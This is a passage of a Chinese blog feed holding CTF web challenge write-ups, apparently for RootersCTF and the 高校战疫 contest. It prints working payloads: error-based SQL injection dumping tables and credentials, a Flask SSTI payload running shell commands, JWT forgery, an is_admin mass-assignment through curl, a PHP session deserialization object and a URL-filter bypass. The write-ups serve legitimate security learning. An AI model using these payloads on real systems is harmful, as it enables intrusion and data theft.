class="keyword">select</span>%<span class="number">0</span>adatabase()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>回显XPATH syntax error:~SQLinjection~，爆出了库名SQLinjection<br>2、爆表名</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://babyweb.rootersctf.<span class="keyword">in</span>/<span class="keyword">index</span>.php?<span class="keyword">search</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>回显XPATH syntax error:~users~，爆出了表名users<br>这里需要说名一下，由于单双引号被过滤，故注入语句中如果有字符串需要单双引号，应当尽量避免，这里可以使用查询语句的多重利用避免，当然直接填库名也是不需要单双引号的（下面表名同理）。<br>3、爆列名</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://babyweb.rootersctf.<span class="keyword">in</span>/<span class="keyword">index</span>.php?<span class="keyword">search</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>回显XPATH syntax error:~user、uniqueid~，爆出列名user、uniqueid，这两个列里肯定有我们需要的重要内容。<br>4、爆字段</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://babyweb.rootersctf.<span class="keyword">in</span>/<span class="keyword">index</span>.php?<span class="keyword">search</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> uniqueid/<span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">limit</span> <span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>这里分两步分别爆出admin和其对应的18位的uniqueid，拿去尝试登录，成功登路并拿到flag。<br>由于环境不能复现，做题的时候也没有截图，这里不再贴出图片。</p><p>报错注入参考链接：<a href="https://www.jianshu.com/p/bf5edd484957">https://www.jianshu.com/p/bf5edd484957</a></p><h2 id="I-lt-3-Flask"><a href="#I-lt-3-Flask" class="headerlink" title="I_&lt;3_Flask"></a>I_&lt;3_Flask</h2><p>典型的SSTI，参考国外师傅的WP学到了一些新姿势</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目：<br><img src="http://www.ggb0n.cool/images/rooters1.png" alt=""></p><p>断定是python flask的SSTI了，但是不知道参数是啥，在复现的时候发现国外师傅提到一个参数扫描的工具<a href="https://github.com/s0md3v/Arjun">arjun</a>，直接扫参数：<br><img src="http://www.ggb0n.cool/images/rooters2.png" alt=""></p><p>用<code>name</code>参数测试一下：<br><img src="http://www.ggb0n.cool/images/rooters3.png" alt=""></p><p>可以看到成功注入，那下面就是利用注入姿势来爆flag了。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>一种解题的payload是：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[184].__init__.__globals__[&#39;__builtins__&#39;].eval(&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[184].__init__.__globals__[&#39;__builtins__&#39;].eval(&#39;__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read()&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是这种方法在复现的时候没有成功，学到另外一种姿势：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;].open(&#39;flag.txt&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/rooters4.png" alt=""></p><p>参考：<br><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8</a><br><a href="https://graneed.hatenablog.com/entry/2019/10/13/010814#Solution-2">https://graneed.hatenablog.com/entry/2019/10/13/010814#Solution-2</a></p><h2 id="ImgXweb"><a href="#ImgXweb" class="headerlink" title="ImgXweb"></a>ImgXweb</h2><p>考察JWT伪造攻击。</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目发现存在注册、登录按钮，先注册一个登录看看，发现可以进行文件上传，但是奈何本题不是考文件上传拿shell的…</p><p>通过扫后台发现<code>robots.txt</code>的存在（可见扫后台的重要性啊）：<br><img src="http://www.ggb0n.cool/images/rooters13.png" alt=""></p><p>而<code>robots.txt</code>中提示了一个<code>secretkey</code>秘钥文件的存在，内容如下：<br><img src="http://www.ggb0n.cool/images/rooters5.png" alt=""></p><p>给这个干嘛？结果抓包发现了另一番天地：<br><img src="http://www.ggb0n.cool/images/rooters6.png" alt=""></p><p>可以看到cookie采用了JWT，拿去base64解密一下（还有几篇讲到JWT伪造攻击的博客，有需要的可以看看）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;&#123;&quot;user&quot;:&quot;ggb0n&quot;&#125;×¿ð¬Á#È¬­ í_mn×Züt</span><br></pre></td></tr></table></figure><p>这肯定是考JWT伪造的了，秘钥都给了，多简单，拿去网站伪造一下：<br><img src="http://www.ggb0n.cool/images/rooters7.png" alt=""></p><p>然后抓包改包，发现成功伪造了admin身份，从回显页面中可以看到<code>flag.png</code>的存在，这里赵师傅没有放原图，应该是为了方便BOT生成和识别固定格式的flag吧：<br><img src="http://www.ggb0n.cool/images/rooters8.png" alt=""></p><p>其实，flag已经很近了，查看源码可以看到flag.png的存储路径，直接访问即可拿到flag：<br><img src="http://www.ggb0n.cool/images/rooters9.png" alt=""></p><p><img src="http://www.ggb0n.cool/images/rooters10.png" alt=""></p><p>原来png不是png，而是txt啊…赵师傅badbad。。。</p><h2 id="notifyxapi"><a href="#notifyxapi" class="headerlink" title="notifyxapi"></a>notifyxapi</h2><p>还是考察JWT伪造攻击。</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，看到给出了几个利用<code>curl</code>进行注册、登录、查看通知的几个操作：<br><img src="http://www.ggb0n.cool/images/rooters11.png" alt=""></p><p><img src="http://www.ggb0n.cool/images/rooters12.png" alt=""></p><p>有点像教怎么用curl的[手动滑稽]，我们根据提供的语句去试试效果：</p><p>先注册个账户：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/register/" -H "Content-<span class="built_in">Type</span>: application/json" -d '&#123;"email": "ggb0n@test.com", "password": "password"&#125;'</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;"created_user":&#123;"id":<span class="number">3</span>,"user":&#123;"email":"ggb0n@test.com","id":<span class="number">3</span>,"is_admin":false&#125;,"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTI2NTEsIm5iZiI6MTU4NDA5MjY1MSwianRpIjoiMTIyZDQ2MTQtNzZhYS00YjJhLTlmZWEtYmY1OTE0ZTQ5OTk0IiwiZXhwIjoxNjE1NjI4NjUxLCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.r8-IqT1VUwqJuYpHgKI6uqQZn6nR07RoDnDWWGgyeVc"&#125;&#125;</span><br></pre></td></tr></table></figure><p>关注的点来了：<code>is_admin</code>属性为<code>false</code>，多半知道这题是干嘛的了。先不管，先登录看看：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/login/" -H "Content-<span class="built_in">Type</span>: application/json" -d '&#123;"email": "ggb0n@test.com", "password": "password"&#125;'</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;"id":&#123;"email":"ggb0n@test.com","id":<span class="number">3</span>,"is_admin":false&#125;,"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTMwNDcsIm5iZiI6MTU4NDA5MzA0NywianRpIjoiZjFlYmViYjItMmFmMi00OWFjLTljN2UtNjFlODM3MTVkN2I2IiwiZXhwIjoxNjE1NjI5MDQ3LCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.Nj2knq7DFsNRoZhNfyAvbMp6wMPV6lWAcXM1p6xIqRo"&#125;</span><br></pre></td></tr></table></figure><p>可以看到登录和注册的时候<code>JWT</code>的第三部分是不同的，也就是表示登录的状态，看通知的话，当然要先登录嘛。</p><p>拿登录上的JWT去看看notification什么情况：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -H "Authorization: Bearer $ACCESS" -H "Content-<span class="built_in">Type</span>: application/json" "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/notifications/"</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">[&#123;"issuer":&#123;"email":"test@test.com","id":<span class="number">2</span>&#125;,"body":"hey, rosssssss","id":<span class="number">2</span>,"<span class="built_in">title</span>":"The IT Crowd"&#125;,&#123;"issuer":&#123;"email":"test@test.com","id":<span class="number">2</span>&#125;,"body":"Jen Barber? Is that the internet?","id":<span class="number">3</span>,"<span class="built_in">title</span>":"The IT Crowd"&#125;]</span><br></pre></td></tr></table></figure><p>通过这个请求，我们可以看到别的用户发的通知，想必管理员能看到不一样的结果吧，结合前面存在的<code>is_admin</code>属性并且为<code>false</code>，思路肯定是要去想办法让<code>is_admin</code>为<code>true</code>了。</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>由于回显的都是注册时候的键值对，我们直接在注册的时候多加一个<code>&quot;id_admin&quot;:true</code>的属性键值对创建个账户试试：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/register/" -H "Content-<span class="built_in">Type</span>: application/json" -d '&#123;"email": "gg.b0n@test.com", "password": <span class="number">1</span>"password","is_admin":true&#125;'</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;"created_user":&#123;"id":<span class="number">4</span>,"user":&#123;"email":"gg.b0n@test.com","id":<span class="number">4</span>,"is_admin":true&#125;,"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM3MzQsIm5iZiI6MTU4NDA5MzczNCwianRpIjoiZjcyMTYzNWEtZTQ1Ny00NTA0LWI0MDEtNjlmMGM1NzM2OGI1IiwiZXhwIjoxNjE1NjI5NzM0LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.NC-cqxfT8wWgsyDzXMo04NLfAK9k7uim8M127DixOAw"&#125;&#125;</span><br></pre></td></tr></table></figure><p>可见账户成功创建了，并且此时<code>is_admin</code>属性已经为<code>true</code>了，快登陆去看看通知：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/login/" -H "Content-<span class="built_in">Type</span>: application/json" -d '&#123;"email": "gg.b0n@test.com", "password": "password"&#125;'</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;"id":&#123;"email":"gg.b0n@test.com","id":<span class="number">4</span>,"is_admin":true&#125;,"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM4ODcsIm5iZiI6MTU4NDA5Mzg4NywianRpIjoiNjUzN2ZlYzMtNzYyOC00ZGZlLTk1MmQtYzE1YmQ5ODhiNjQ0IiwiZXhwIjoxNjE1NjI5ODg3LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FiyXpksBx-zkMQDEkfW61bs2FtqttNz5Qv1yHStqWrM"&#125;</span><br></pre></td></tr></table></figure><p>用登录上的<code>JWT</code>去看通知：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">export ACCESS="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM4ODcsIm5iZiI6MTU4NDA5Mzg4NywianRpIjoiNjUzN2ZlYzMtNzYyOC00ZGZlLTk1MmQtYzE1YmQ5ODhiNjQ0IiwiZXhwIjoxNjE1NjI5ODg3LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FiyXpksBx-zkMQDEkfW61bs2FtqttNz5Qv1yHStqWrM"</span><br><span class="line"></span><br><span class="line">curl -H "Authorization: Bearer $ACCESS" -H "Content-<span class="built_in">Type</span>: application/json" "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/notifications/"</span><br></pre></td></tr></table></figure><p>回显如下：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">[&#123;"issuer":&#123;"email":"admin@test.com","id":<span class="number">1</span>&#125;,"body":"rooters&#123;a_big_hard_business_in_a_big_hard_building&#125;ctf","id":<span class="number">1</span>,"<span class="built_in">title</span>":"flag"&#125;,&#123;"issuer":&#123;"email":"test@test.com","id":<span class="number">2</span>&#125;,"body":"hey, rosssssss","id":<span class="number">2</span>,"<span class="built_in">title</span>":"The IT Crowd"&#125;,&#123;"issuer":&#123;"email":"test@test.com","id":<span class="number">2</span>&#125;,"body":"Jen Barber? Is that the internet?","id":<span class="number">3</span>,"<span class="built_in">title</span>":"The IT Crowd"&#125;,&#123;"issuer":&#123;"email":"admin@test.com","id":<span class="number">1</span>&#125;,"body":"flag&#123;<span class="number">1</span>b411b83-d725-<span class="number">4</span>e8f-a50a-<span class="number">3</span>bd14a35de6a&#125;","id":<span class="number">1</span>,"<span class="built_in">title</span>":"flag"&#125;]</span><br></pre></td></tr></table></figure><p>成功拿到flag。<br>这题算是考察JWT伪造比较简单的了吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTFtime上国外的比赛还是比较多的，而且大多也都比较有意思，开拓视野。
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="赛题复现" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/tags/CTF/"/>
    
      <category term="web" scheme="http://ggb0n.cool/tags/web/"/>
    
      <category term="Cookie攻击" scheme="http://ggb0n.cool/tags/Cookie%E6%94%BB%E5%87%BB/"/>
    
      <category term="SQL注入" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="报错注入" scheme="http://ggb0n.cool/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    
      <category term="JWT伪造" scheme="http://ggb0n.cool/tags/JWT%E4%BC%AA%E9%80%A0/"/>
    
      <category term="SSTI" scheme="http://ggb0n.cool/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>高校战&quot;疫&quot;部分题解</title>
    <link href="http://ggb0n.cool/2020/03/07/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <id>http://ggb0n.cool/2020/03/07/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</id>
    <published>2020-03-07T06:44:03.000Z</published>
    <updated>2020-04-22T00:16:24.231Z</updated>
    
    <content type="html"><![CDATA[<p>20多所高校联合出题抗“疫”的比赛，排面也是可以的，来感受一下优秀高校的熏陶。🧐<a id="more"></a></p><h1 id="DAY-1"><a href="#DAY-1" class="headerlink" title="DAY 1"></a>DAY 1</h1><p>看队友师傅们分享的文章，磕磕碰碰总算也做出了几题</p><h2 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h2><p>考察sql注入</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入题目，可以直接看源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=sqlsql;charset=utf8;'</span>, <span class="string">'xxx'</span>, <span class="string">'xxx'</span>);</span><br><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);</span><br><span class="line">    $stmt = $pdo-&gt;prepare(<span class="string">"SELECT username from users where username='$&#123;_POST['username']&#125;' and password='$&#123;_POST['password']&#125;'"</span>);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $result = $stmt-&gt;fetchAll();</span><br><span class="line">    <span class="keyword">if</span> (count($result) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($result[<span class="number">0</span>][<span class="string">'username'</span>] == <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    <span class="comment">// ....</span></span><br></pre></td></tr></table></figure><p>发现又是用的<code>PDO</code>，前段时间刷题，还有赛题都出现了，这怕是一种趋势。</p><p>不过这题不难，尝试了一下，一般的万能密码是不好用了，因为<code>or</code>被ban了，但是通过读代码很容易能发现<code>password</code>处存在注入，<code>or</code>不能用了，但是利用减号可以构造一个<code>password=false</code>的语句，这样就不在判断<code>password</code>了，最后利用 <code>admin/1&#39;-&#39;1</code>登录即可拿到flag。</p><h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p>考察<code>PHP session</code>的反序列化漏洞，主要利用了<code>session.serialize_handler</code>序列化和反序列化采用<code>PHP</code>而导致的漏洞。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，首先登录上发现可以更改<code>sign</code>，应该与管理员权限有关。但是抓包也看不出可利用的点。</p><p>然后就扫了后台，真的存在源码！在<code>/www.zip</code>路径下，下载之后又是一番代码审计，在<code>profile.php</code>发现了问题：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $sign;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = $_SESSION[<span class="string">'admin'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sign = $_SESSION[<span class="string">'sign'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sign;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span><br><span class="line">            redirect(<span class="string">'./core/index.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> info();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，这里<code>session.serialize_handler</code>用的是<code>PHP</code>，而<code>init.php</code>中处理器的设置是<code>php_serialize</code>这样就可以参考前面提到的<code>PHP session</code>的漏洞了。<br>再往下审计发现这里定义了<code>info</code>类，其中有<code>admin</code>和<code>sign</code>属性，并且<code>__destruct()</code>中指明如果<code>admin===1</code>就会定向到<code>/core/index.php</code>，这是个什么文件？去看一下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#变成管理员吧，奥利给</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'只有管理员才能看到我哟'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处无银三百两了，解题的关键肯定在这，但是这个地方会对<code>$_SESSION</code>进行检查，它又包含什么呢？<br>在<code>upload_sign.php</code>下发现了内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'init.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload_sign</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sign;</span><br><span class="line">    <span class="keyword">public</span> $admin = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'sign'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign = $_POST[<span class="string">'sign'</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign = <span class="string">"这里空空如也哦"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checksign(<span class="keyword">$this</span>-&gt;sign)) &#123;</span><br><span class="line">            $_SESSION[<span class="string">'sign'</span>] = <span class="keyword">$this</span>-&gt;sign;</span><br><span class="line">            $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"???"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checksign</span><span class="params">($sign)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> upload_sign();</span><br><span class="line">$a-&gt;upload();</span><br></pre></td></tr></table></figure><p>可以看到，在这里会对<code>$_SESSION</code>中的<code>admin</code>和<code>sign</code>属性赋值，从这里我们也就可以对<code>session</code>中的<code>admin</code>进行控制了，参考<a href="https://www.cnblogs.com/hf99/p/9746038.html">这里</a>，即在设置<code>sign</code>的页面POST一个键值对，并且变量名与<code>session.upload_progress.name</code>相同，即可在<code>session</code>中写入新的内容。</p><p>根据这个思路，我们构造payload：</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">ggb0n</span>|<span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"info"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"admin"</span>;<span class="attribute">i</span>:<span class="number">1</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"sign"</span>;<span class="attribute">s</span>:<span class="number">0</span>:<span class="string">""</span>;&#125;</span><br></pre></td></tr></table></figure><p>在修改<code>sign</code>的页面抓包，写入payload：<br><img src="http://www.ggb0n.cool/images/gxctf01.png" alt=""></p><p>结果成功设置签名：<br><img src="http://www.ggb0n.cool/images/gxctf02.png" alt=""></p><p>现在就是admin权限了，到<code>/core/</code>下发现如下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">./sandbox/ed04d2f141bd8a57cc5732b0ccf32456 <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#hint : core/clear.php</span></span><br><span class="line">    $sandbox = <span class="string">'./sandbox/'</span> . md5(<span class="string">"Mrk@1xI^"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">        $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, $url)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you are hacker"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $res = parse_url($url);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, $res[<span class="string">'host'</span>])) &#123;</span><br><span class="line">                    $code = file_get_contents($url);</span><br><span class="line">                    <span class="keyword">if</span> (strlen($code) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">                        @exec($code);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"invalid url"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'只有管理员才能看到我哟'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，我们需要利用<code>url</code>进行命令执行，并且<code>data://</code>被ban了，这里想到了ByteCTF一道题的绕过姿势，先放这，url中需要有<code>127.0.0.1</code>才能进一步执行命令，可以参考<a href="https://www.secpulse.com/archives/67064.html">如何绕过URL限制</a>这篇文章，这里用<code>@</code>来绕过，然后利用<code>compress.zlib://</code>来满足<code>file_get_contents</code>函数的读取，成功过一卡。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="symbol">'url</span><span class="string">':'</span>compress.zlib:<span class="comment">//data:@127.0.0.1/plain;base64,'</span></span><br></pre></td></tr></table></figure><p>正入万山圈子里啊…还要要求执行的命令长度不能超过4…想到了HITCON的一道题，<a 